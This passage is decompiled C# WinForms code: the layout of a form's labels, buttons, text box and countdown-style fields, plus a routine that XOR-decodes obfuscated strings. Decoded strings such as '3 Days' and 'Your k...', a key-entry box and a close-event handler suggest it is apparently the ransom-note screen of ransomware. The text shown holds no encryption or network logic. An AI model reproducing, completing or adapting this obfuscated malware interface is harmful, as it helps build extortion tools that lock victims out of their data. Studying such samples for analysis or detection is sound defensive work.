		((Control)label_5).set_Location(new Point(205, 358));
		((Control)label_5).set_Name(smethod_4("jŤɦ\u0366ѮԷ"));
		((Control)label_5).set_Size(new Size(520, 16));
		((Control)label_5).set_TabIndex(8);
		((Control)label_5).set_Text(smethod_4("\u001dĬȷ\u0361ФՐ\u0650ܚࡈछ\u0a52\u0b58\u0c4e\u0d52ถཔ\u1058ᅟሒፅᑘᕊᘎ\u1759ᡅ᥆ᩏᬉᱛᵈḆὍ⁑⅑≐⍘␀╪♮✽⡽⥵⩾⬹ⱼ\u2d78\u2e78⼲だㄳ㉥㍰㑣㕻㙫㜭㡵㥤㩿㭻㰨㵳㹯㽨䁡䄢䈏䌋"));
		label_5.set_TextAlign((ContentAlignment)32);
		((Control)label_6).set_AutoSize(true);
		((Control)label_6).set_BackColor(SystemColors.ActiveCaptionText);
		((Control)label_6).set_Font(new Font(smethod_4("GŚȨ\u0357сժ\u0670ݫ\u086b\u0962"), 12f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)label_6).set_ForeColor(Color.White);
		((Control)label_6).set_Location(new Point(119, 374));
		((Control)label_6).set_Name(smethod_4("jŤɦ\u0366ѮԶ"));
		((Control)label_6).set_Size(new Size(692, 16));
		((Control)label_6).set_TabIndex(9);
		((Control)label_6).set_Text(smethod_4("\u0013Ŀɸ\u0323о\u0530ٴ\u0732࠾ऽ\u0a3fସఫഩ\u0e6c\u0f3fဣᄤር፧ᐯᔶᙤ᜶ᠲᥡᨷ᭖\u1c4aᵕṓ\u1f4e⁎ℙ≕⍖\u245d╜♚❔⠒⥅⩘⭊Ⰾⵝ⹍⽒ぇㅌ㉆㍓㐊㔅㙝㝌㡗㥓㨀㭹㱷㵱㹹㽨䀺䅮䉱䍻䑺䔵䙶䝶䠲䥴䩾䭬䱼䵴乼使偯六刨卡呩啷噡坵塧女"));
		label_6.set_TextAlign((ContentAlignment)32);
		((Control)label_7).set_AutoSize(true);
		((Control)label_7).set_BackColor(SystemColors.ActiveCaptionText);
		((Control)label_7).set_Font(new Font(smethod_4("GŚȨ\u0357сժ\u0670ݫ\u086b\u0962"), 11.25f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)label_7).set_ForeColor(Color.White);
		((Control)label_7).set_Location(new Point(252, 450));
		((Control)label_7).set_Name(smethod_4("jŤɦ\u0366ѮԹ"));
		((Control)label_7).set_Size(new Size(174, 15));
		((Control)label_7).set_TabIndex(10);
		((Control)label_7).set_Text(smethod_4("KŞɅ\u035dЮ՝ىݙ\u0859\u0946\u0a46\u0b49\u0c47\u0d49ฤཊ၆ᄻ"));
		label_7.set_TextAlign((ContentAlignment)32);
		((Control)label_8).set_AutoSize(true);
		((Control)label_8).set_BackColor(SystemColors.ActiveCaptionText);
		((Control)label_8).set_Font(new Font(smethod_4("GŚȨ\u0357сժ\u0670ݫ\u086b\u0962"), 12f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)label_8).set_ForeColor(Color.White);
		((Control)label_8).set_Location(new Point(267, 242));
		((Control)label_8).set_Name(smethod_4("jŤɦ\u0366ѮԸ"));
		((Control)label_8).set_Size(new Size(397, 16));
		((Control)label_8).set_TabIndex(11);
		((Control)label_8).set_Text(smethod_4("mŜɇ\u0311ўՊ\u064b\u0749ࠌ\u0952\u0a45ଡ଼ౚഇ๖ཀ\u1056ᅐቍፏᑎᕾᙲ\u173dᡷ\u197e\u1a63\u1b39ᱬᵸḶάⁱⅰ≠⍨①╻☮❴⡣⥾⩸⬩Ɱ\u2d6e\u2e6a⽠ぷㄭ㈏㌋"));
		label_8.set_TextAlign((ContentAlignment)32);
		((Control)label_9).set_AutoSize(true);
		((Control)label_9).set_BackColor(SystemColors.ActiveCaptionText);
		((Control)label_9).set_Font(new Font(smethod_4("GŚȨ\u0357сժ\u0670ݫ\u086b\u0962"), 12f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)label_9).set_ForeColor(Color.White);
		((Control)label_9).set_Location(new Point(226, 294));
		((Control)label_9).set_Name(smethod_4("kŧɧ\u0361ѯԳر"));
		((Control)label_9).set_Size(new Size(478, 16));
		((Control)label_9).set_TabIndex(12);
		((Control)label_9).set_Text(smethod_4("cŖɍ\u0317јՐ\u0651ݗࠒ\u0945\u0a5fଏ\u0c5e\u0d4c๕་ယᄇመ\u1317ᐐᔕᘄᝡᡫᥢ\u1a74᭐᱗ᵓṏἻ\u206eⅶ∸⍰⑳╡☴❪⡽⥤⩢⬯Ȿ\u2d68\u2e7e⽸づㅧ㉦㍦㑪㔥㙯㝦㡻㤯"));
		label_9.set_TextAlign((ContentAlignment)32);
		((Control)label_10).set_AutoSize(true);
		((Control)label_10).set_BackColor(SystemColors.ActiveCaptionText);
		((Control)label_10).set_Font(new Font(smethod_4("GŚȨ\u0357сժ\u0670ݫ\u086b\u0962"), 12f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)label_10).set_ForeColor(Color.White);
		((Control)label_10).set_Location(new Point(160, 329));
		((Control)label_10).set_Name(smethod_4("kŧɧ\u0361ѯԳذ"));
		((Control)label_10).set_Size(new Size(399, 16));
		((Control)label_10).set_TabIndex(13);
		((Control)label_10).set_Text(smethod_4("qŝə\u034cхԍلݎࡘ\u094cਈ\u0b4e\u0c40അ\u0e5dཌ\u1057ᄁቄ፰ᑰᔺᙨ\u173bᡱ\u1977\u1a77᭠\u1c36ᵽṻὤ′Ⅵ≿⌯⑬╸♵✫⡨⥠⩼⭤Ⱪ\u2d6c\u2e6a⽰〢႓"));
		label_10.set_TextAlign((ContentAlignment)32);
		((Control)button_1).set_Font(new Font(smethod_4("GŚȨ\u0357сժ\u0670ݫ\u086b\u0962"), 11.25f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((ButtonBase)button_1).set_ImageKey(smethod_4("/ŧɰ\u0367Ѷլب"));
		((Control)button_1).set_Location(new Point(565, 321));
		((Control)button_1).set_Name(smethod_4("eųɱͰѬլس"));
		((Control)button_1).set_Size(new Size(205, 31));
		((Control)button_1).set_TabIndex(14);
		((Control)button_1).set_Text(smethod_4("\\ŜɅ\u0331фՀخݏ\u0859\u0952ਪ\u0b4b\u0c41\u0d53ๅཊ၍ᅍቑጾ"));
		((Control)button_1).add_Click((EventHandler)button_1_Click);
		((Control)label_11).set_AutoSize(true);
		((Control)label_11).set_BackColor(SystemColors.ActiveCaptionText);
		((Control)label_11).set_Font(new Font(smethod_4("GŚȨ\u0357сժ\u0670ݫ\u086b\u0962"), 12f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)label_11).set_ForeColor(Color.White);
		((Control)label_11).set_Location(new Point(72, 620));
		((Control)label_11).set_Name(smethod_4("kŧɧ\u0361ѯԳس"));
		((Control)label_11).set_Size(new Size(787, 16));
		((Control)label_11).set_TabIndex(15);
		((Control)label_11).set_Text(smethod_4("*ĄɁ\u0319аԫٽ\u073d࠷न\u0a3cହళയ\u0e75\u0f39\u1032ᄶሴ፰ᐻᔦᘨᝬᠻ\u192bᨰᬭ\u1c2aᴣḫἰ\u2063℣∯⌤␟╌♘❟⡞⥓⩏⭝ⱓⴖ⹌⽛うㅀ㈑㍀㑊㕜㙞㝃㡅㥄㩈㭄㰇㵍㹀㽝䀏䄂䉑䍌䑺䕿䙮䝹䠻䥹䩵䭱䱴䵽丵佻偽儲剥卸呪售噯坹塿奾婦学尧嵤幠彨恬慵戯"));
		label_11.set_TextAlign((ContentAlignment)32);
		((Control)label_12).set_AutoSize(true);
		((Control)label_12).set_BackColor(SystemColors.ActiveCaptionText);
		((Control)label_12).set_Font(new Font(smethod_4("_Ÿɳͽѡվ٣ݭ\u087eऩ\u0a51୦\u0c4eൠ\u0e6d༣\u1057ᅈ"), 14.25f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)label_12).set_ForeColor(Color.White);
		((Control)label_12).set_Location(new Point(854, 681));
		((Control)label_12).set_Name(smethod_4("kŧɧ\u0361ѯԳص"));
		((Control)label_12).set_Size(new Size(76, 26));
		((Control)label_12).set_TabIndex(17);
		((Control)label_12).set_Text(smethod_4("5ĥɀ\u0362ѻղ"));
		((Control)label_13).set_AutoSize(true);
		((Control)label_13).set_BackColor(SystemColors.ActiveCaptionText);
		((Control)label_13).set_Font(new Font(smethod_4("_Ÿɳͽѡվ٣ݭ\u087eऩ\u0a51୦\u0c4eൠ\u0e6d༣\u1057ᅈ"), 14.25f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)label_13).set_ForeColor(Color.White);
		((Control)label_13).set_Location(new Point(636, 655));
		((Control)label_13).set_Name(smethod_4("kŧɧ\u0361ѯԳز"));
		((Control)label_13).set_Size(new Size(296, 26));
		((Control)label_13).set_TabIndex(16);
		((Control)label_13).set_Text(smethod_4("GŲɩ\u0369кղٽݮ࠶\u0962\u0a7d\u0b7f౾റ\u0e72ཪ\u102eᅩቩ፸ᑾᕻᙧ\u177eᡣᥡᨤ᭪ᱬᴻ"));
		((Control)pictureBox_1).set_BackColor(Color.Black);
		((Control)pictureBox_1).set_Location(new Point(380, 6));
		((Control)pictureBox_1).set_Name(smethod_4("{ţɪͼѲմ٠\u0746\u086cॺਲ਼"));
		((Control)pictureBox_1).set_Size(new Size(171, 119));
		pictureBox_1.set_TabIndex(18);
		pictureBox_1.set_TabStop(false);
		panel_0.set_BorderStyle((BorderStyle)2);
		((Control)panel_0).get_Controls().Add((Control)(object)textBox_0);
		((Control)panel_0).get_Controls().Add((Control)(object)button_2);
		((Control)panel_0).get_Controls().Add((Control)(object)button_3);
		((Control)panel_0).set_Location(new Point(298, 281));
		((Control)panel_0).set_Name(smethod_4("vŤɪ\u0366Ѯ\u0530"));
		((Control)panel_0).set_Size(new Size(334, 112));
		((Control)panel_0).set_TabIndex(19);
		((Control)button_3).set_Font(new Font(smethod_4("GŚȨ\u0357сժ\u0670ݫ\u086b\u0962"), 11.25f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((ButtonBase)button_3).set_ImageKey(smethod_4("/ŧɰ\u0367Ѷլب"));
		((Control)button_3).set_Location(new Point(225, 82));
		((Control)button_3).set_Name(smethod_4("eųɱͰѬլز"));
		((Control)button_3).set_Size(new Size(102, 24));
		((Control)button_3).set_TabIndex(20);
		((Control)button_3).set_Text(smethod_4("Jŀɂ\u0345юԤو\u0747ࡘ"));
		((Control)button_3).add_Click((EventHandler)button_3_Click);
		((Control)button_2).set_Font(new Font(smethod_4("GŚȨ\u0357сժ\u0670ݫ\u086b\u0962"), 11.25f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((ButtonBase)button_2).set_ImageKey(smethod_4("/ŧɰ\u0367Ѷլب"));
		((Control)button_2).set_Location(new Point(3, 82));
		((Control)button_2).set_Name(smethod_4("eųɱͰѬլص"));
		((Control)button_2).set_Size(new Size(68, 24));
		((Control)button_2).set_TabIndex(21);
		((Control)button_2).set_Text(smethod_4("FňɌ\u0351ф"));
		((Control)button_2).add_Click((EventHandler)button_2_Click);
		((Control)textBox_0).set_Location(new Point(3, 3));
		((TextBoxBase)textBox_0).set_Multiline(true);
		((Control)textBox_0).set_Name(smethod_4("|Ţɾͱцլٺ\u0730"));
		((Control)textBox_0).set_Size(new Size(324, 73));
		((Control)textBox_0).set_TabIndex(22);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_ClientSize(new Size(930, 707));
		((Control)this).get_Controls().Add((Control)(object)panel_0);
		((Control)this).get_Controls().Add((Control)(object)pictureBox_1);
		((Control)this).get_Controls().Add((Control)(object)label_12);
		((Control)this).get_Controls().Add((Control)(object)label_13);
		((Control)this).get_Controls().Add((Control)(object)label_11);
		((Control)this).get_Controls().Add((Control)(object)button_1);
		((Control)this).get_Controls().Add((Control)(object)label_10);
		((Control)this).get_Controls().Add((Control)(object)label_9);
		((Control)this).get_Controls().Add((Control)(object)label_8);
		((Control)this).get_Controls().Add((Control)(object)label_7);
		((Control)this).get_Controls().Add((Control)(object)label_6);
		((Control)this).get_Controls().Add((Control)(object)label_5);
		((Control)this).get_Controls().Add((Control)(object)label_4);
		((Control)this).get_Controls().Add((Control)(object)label_3);
		((Control)this).get_Controls().Add((Control)(object)label_2);
		((Control)this).get_Controls().Add((Control)(object)label_1);
		((Control)this).get_Controls().Add((Control)(object)richTextBox_0);
		((Control)this).get_Controls().Add((Control)(object)label_0);
		((Control)this).get_Controls().Add((Control)(object)button_0);
		((Control)this).get_Controls().Add((Control)(object)pictureBox_0);
		((Form)this).set_FormBorderStyle((FormBorderStyle)1);
		((Form)this).set_Icon((Icon)componentResourceManager.GetObject(smethod_4(".Žɠ\u036eѵԫ\u064dݠ\u086d९")));
		((Form)this).set_MaximizeBox(false);
		((Form)this).set_MinimizeBox(false);
		((Control)this).set_Name(smethod_4("Cūɱ\u036fа"));
		((Form)this).set_StartPosition((FormStartPosition)1);
		((Control)this).set_Text(smethod_4("OŹɳ\u0379Ѽըيݪࡧ२੧୳"));
		((Form)this).add_FormClosing(new FormClosingEventHandler(GForm0_FormClosing));
		((Form)this).add_Load((EventHandler)GForm0_Load);
		((ISupportInitialize)pictureBox_0).EndInit();
		((ISupportInitialize)pictureBox_1).EndInit();
		((Control)panel_0).ResumeLayout(false);
		((Control)panel_0).PerformLayout();
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}

	private static string smethod_4(string string_2)
	{
		int length = string_2.Length;
		char[] array = new char[length];
		for (int i = 0; i < array.Length; i++)
		{
			char c = string_2[i];
			byte b = (byte)(c ^ (length - i));
			byte b2 = (byte)(((int)c >> 8) ^ i);
			array[i] = (char)((b2 << 8) | b);
		}
		return string.Intern(new string(array));
	}
}
